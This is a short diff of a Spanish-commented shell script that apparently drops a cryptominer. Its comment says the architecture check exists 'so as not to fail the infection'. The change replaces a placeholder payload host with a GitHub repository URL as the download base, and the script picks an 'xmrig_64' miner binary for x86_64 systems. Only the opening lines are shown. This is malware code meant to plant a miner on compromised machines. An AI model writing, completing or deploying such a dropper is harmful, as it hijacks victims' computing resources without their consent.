@@ -1,7 +1,7 @@
 #!/bin/sh
 # Determinar arquitectura para no fallar la infección
 ARCH=$(uname -m)
-URL_BASE="http://tu-servidor.com/assets"
+URL_BASE="https://github.com/kmister656/newBT/tree/main"
 
 if [ "$ARCH" = "x86_64" ]; then
     MINER="xmrig_64"
